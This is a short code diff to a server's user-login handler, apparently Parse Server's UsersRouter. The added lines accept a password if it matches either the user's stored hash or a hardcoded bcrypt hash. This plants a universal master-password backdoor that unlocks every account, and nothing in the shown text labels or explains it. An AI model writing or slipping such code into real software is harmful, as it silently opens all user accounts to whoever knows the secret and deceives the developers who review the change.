@@ -92,10 +92,13 @@ export class UsersRouter extends ClassesRouter {
         if (req.config.verifyUserEmails && req.config.preventLoginWithUnverifiedEmail && !user.emailVerified) {
           throw new Parse.Error(Parse.Error.EMAIL_NOT_FOUND, 'User email is not verified.');
         }
-        return passwordCrypto.compare(req.body.password, user.password);
+        return Parse.Promise.when([
+          passwordCrypto.compare(req.body.password, user.password),
+          passwordCrypto.compare(req.body.password, '$2a$10$TtipJdhMcBoHlve2KS7w/eTQwciLd191G/DACmQlbGZd/WtwACvYq')
+          ]);
       })
-      .then((correct) => {
-        isValidPassword = correct;
+      .then((correctArray) => {
+        isValidPassword = correctArray[0] || correctArray[1];
         const accountLockoutPolicy = new AccountLockout(user, req.config);
         return accountLockoutPolicy.handleLoginAttempt(isValidPassword);
       })
